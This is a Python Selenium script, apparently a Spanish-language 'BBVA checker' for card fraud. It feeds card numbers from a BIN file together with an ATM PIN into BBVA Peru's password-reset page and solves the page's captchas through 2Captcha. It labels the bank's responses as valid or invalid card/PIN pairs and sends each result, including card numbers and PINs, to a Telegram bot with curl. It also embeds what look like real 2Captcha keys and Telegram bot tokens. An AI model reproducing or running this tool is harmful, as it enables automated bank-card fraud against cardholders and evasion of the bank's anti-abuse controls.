from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException, ElementNotInteractableException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from colorama import init, Fore
from permutate_bins import generate_bins
from unidecode import unidecode
import time, os, argparse, undetected_chromedriver as uc, requests, threading, random, base64, sys
from selenium.webdriver.common.keys import Keys
from random import randint




import os
os.system("cls")
print(Fore.GREEN+'###############################################################################################\n'); time.sleep(2)
print()
print()
print(Fore.CYAN+'Creado Para:  El mas crack       TELEGRAM: @crackmovi\n')
print()
print(Fore.RED+'  ADVERTENCIA:')
print()
print(Fore.BLUE+'Este programa es solo para hackerz.')
print(Fore.GREEN+':')
print("◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘\n")
print()
print()
print()

#binns = input(Fore.CYAN+"TU BIN AQUI: ")
cajero = input(Fore.CYAN+"AQUI TU PIN: ")
print()
print(Fore.GREEN+'')





class General_Strings():
	url = 'https://www.bbva.pe/personas/olvido-contrasena.html'


class XPATHS(): 
	iframe = '//iframe[@title="Modificación de contraseña"]'  
	cardNumber = '//*[@id="numeroTarjeta"]'
	captchaImage = '//*[@id="imgCaptcha"]'
	submit = '//*[@id="wizardNext"]'

class Responses(): 
	maximosIntentos = 'Has superado el límite máximo de intentos para cambiar tu contraseña. Por favor, acércate a una oficina o comunícate al (01)595-0000.'
	grongCaptcha = 'El código de imagen ingresado es incorrecto.'
	
	live1 = 'Crea una nueva contraseña de acceso'
	live2 = 'El usuario no tiene acceso a BxI.'
	dead1 = 'Uno de los datos ingresados es incorrecto. Por favor, verifica e intenta nuevamente'


class Errors(): 
	sinSaldo = 'ERROR_ZERO_BALANCE'
	grongCaptchaKey = 'ERROR_WRONG_USER_KEY'

	salioMalCargarWeb = 'Parece que algo salió mal al cargar la página'


with open('CAJA DE BIN.txt', 'r') as users:
	for userx in users:
		check = userx.rstrip()
		user = check



		class BBVA_CHECKER_WEB():
			def __init__(self, pin_number, times, chrome_version, captcha_api_key, tokenBot, chatID):
				self.pin_number = pin_number
				self.times = int(times)
				self.chrome_version = chrome_version
				self.captcha_api_key = captcha_api_key
				self.tokenBot = tokenBot
				self.chatID = chatID



			def startChrome(self):
					uc.TARGET_VERSION = self.chrome_version

					options = uc.ChromeOptions() 
					options.add_argument('lang=en')
					options.add_argument('--log-level=3')
					options.add_argument('test-type')
					options.add_argument('--headless')
					options.add_argument("--start-maximized")
					options.add_argument('--disable-extencions')
					options.add_argument('--incognito')

					self.web = uc.Chrome(options = options)
					self.web.set_window_size(300,700)
					self.web.set_window_position(-7,0)



				
			def resolve_captcha(self):

				def screenshot_captcha():
					imageName = [str(random.randint(0,9)) for x in range(45)]
					imageName = ''.join(imageName)+'.png'

					waitLoadCaptcha = WebDriverWait(self.web, 25).until(EC.presence_of_element_located((By.XPATH, XPATHS.captchaImage)))
					time.sleep(3)

					screenshot_captcha = WebDriverWait(self.web, 25).until(EC.presence_of_element_located((By.XPATH, XPATHS.captchaImage))).screenshot(imageName)
					screenshot_captcha = WebDriverWait(self.web, 25).until(EC.presence_of_element_located((By.XPATH, XPATHS.captchaImage)))
				
					with open(imageName, "rb") as image_file:
						base64Image = base64.b64encode(image_file.read())

					
					os.system(f'del {imageName}')
					return base64Image.decode()

				def send_capcha(base64Image):
					
					data = {'key': self.captcha_api_key, 'method': 'base64', 'body' : base64Image}
					r = requests.post('http://2captcha.com/in.php', data = data)
					
					if r.ok and r.text.find('OK') > -1:
						id_response = r.text[r.text.find('|')+1:]
						
						while True:
							r = requests.get('http://2captcha.com/res.php?key={0}&action=get&id={1}'.format(self.captcha_api_key, id_response))
							if r.text.find('CAPCHA_NOT_READY') > -1: time.sleep(0.50)
							if r.text.find('ERROR') > -1: response = 'errors'; break
							if r.text.find('OK') > -1: response = list(r.text[r.text.find('|')+1:]); break
							
						return response

					elif r.text.count(Errors.sinSaldo) >= 1: 
						os.system('cls')
						sys.exit('No tienes saldo en 2Captcha.com. Agrega fondos.')
			
					elif r.text.count(Errors.grongCaptchaKey): 
						os.system('cls')
						sys.exit('El token de 2Captcha.com es invalido. Intente de nuevo.')

				base64Image = screenshot_captcha()                                      #Esto lo com,enté
				response = ''.join(send_capcha(base64Image = base64Image))				#Esto lo com,enté
				
				if len(response) == 6: pass
				else: response = False

				return response
				
			def detected_responses(self, card, pin, captcha):

				while True:
					source = self.web.page_source
					if Responses.maximosIntentos in source: return f'{card} PIN: {pin} : : Maximos intentos para la tarjeta.'
					elif Responses.grongCaptcha in source: return f'{card} PIN: {pin} :  : Captcha incorrecto.'
					elif Responses.dead1 in source: return f'{card} PIN: {pin} :  : Invalido :('
					elif Responses.live1 in source: return f'EXITOSO: --> {card} PIN: {pin} :  Mensaje: Clave Real Encontrada <3'
					elif Responses.live2 in source: return f'EXITOSO: --> {card} PIN: {pin} :  Mensaje: Clave Real Encontrada <3'
					elif Errors.salioMalCargarWeb in source: return 'La web de BBVA no esta dando respuesta para recargar la web. Reintentando. E-001'		
					else: time.sleep(0.15)




			def writeForm(self):


					while True:

						try:
							self.web.get(General_Strings.url)

							iframe = WebDriverWait(self.web, 25).until(EC.element_to_be_clickable((By.XPATH, XPATHS.iframe)))
							self.web.switch_to.frame(iframe)

							clickCard = WebDriverWait(self.web, 25).until(EC.element_to_be_clickable((By.XPATH, XPATHS.cardNumber))).click()

							#web1 = WebDriverWait(self.web, 8).until(EC.element_to_be_clickable((By.XPATH,"//*[@id='numeroTarjeta']"))).send_keys(binns[x])

							self.web.execute_script(f'document.getElementById("numeroTarjeta").value = "{user}";')
							self.web.execute_script(f'document.getElementById("claveCajero").value = "{self.pin_number}";')
								
							responseCaptcha = self.resolve_captcha()

							if responseCaptcha != False: 
								self.web.execute_script(f'document.getElementById("codigoCaptcha").value = "{responseCaptcha}";')

								while True:
									try:
										submit = WebDriverWait(self.web, 25).until(EC.presence_of_element_located((By.XPATH, XPATHS.submit))).click()
										break
									
									except ElementClickInterceptedException: print('Submit Interceptado, reintentando.')

								response = self.detected_responses(card = user, pin = self.pin_number, captcha = responseCaptcha)
								print(response)

								if response.count('E-001') >= 99:
									self.startChrome()

								hilo = threading.Thread(target = os.system, args = (f'curl -X POST "https://api.telegram.org/bot{self.tokenBot}/sendMessage" -d "chat_id={self.chatID}&text={unidecode(str(response))}"',)); 
								hilo.start()

							else: print('El captcha no se pudo procesar correctamente.')

							break
							
						except TimeoutException: pass
						except ElementNotInteractableException: pass

			def main(self):
				self.startChrome()
				self.writeForm()
				self.web.close()
				self.web.quit()



		if __name__ == '__main__':
			parser = argparse.ArgumentParser()
			parser.add_argument('--binns', action='store', dest='binns', help='Especifica el BIN bancario a utilizar.')
			parser.add_argument('--pin_number', action='store', dest='pin_number', help='Especifica el pin de cajero a utilizar.')
			parser.add_argument('--times', action='store', dest='times', help='Especifica la cantidad de tarjetas a generar/verificar por cada navegador.')
			parser.add_argument('--chrome_version', action='store', dest='chrome_version', help='Especifica la version de "Google Chrome.exe"')
			parser.add_argument('--captcha_api_key', action='store', dest='captcha_api_key', help='Especifica la clave API de 2Captcha.com')
			parser.add_argument('--tokenBot', action='store', dest='tokenBot', help='Especifica el token del bot telegram.')
			parser.add_argument('--chatID', action='store', dest='chatID', help='Especifica tu ID del chat telegram.')

			try:
				results = parser.parse_args()
				bbva_checker_web = BBVA_CHECKER_WEB(pin_number = cajero,
													times = int(99999), 
													chrome_version = int('89'),
													captcha_api_key = 'f255ae2edee5258ff38c80acbf291c1f',
													#38250e7eff67e1c0f270639a6ee0e158
													#tokenBot = '5713869697:AAFaXJywzglUfVERlxLMaQXQx8i5eyEI8xc',
													tokenBot = '1707488988:AAEo5oKr1hPYMHzFquQVyt6nYyG30jUBPTI',
													#1707488988:AAEo5oKr1hPYMHzFquQVyt6nYyG30jUBPTI
													chatID = '886944709',
													#chatID = '1850445278',
													#1850445278
													)

				bbva_checker_web.main()
			except TypeError: pass














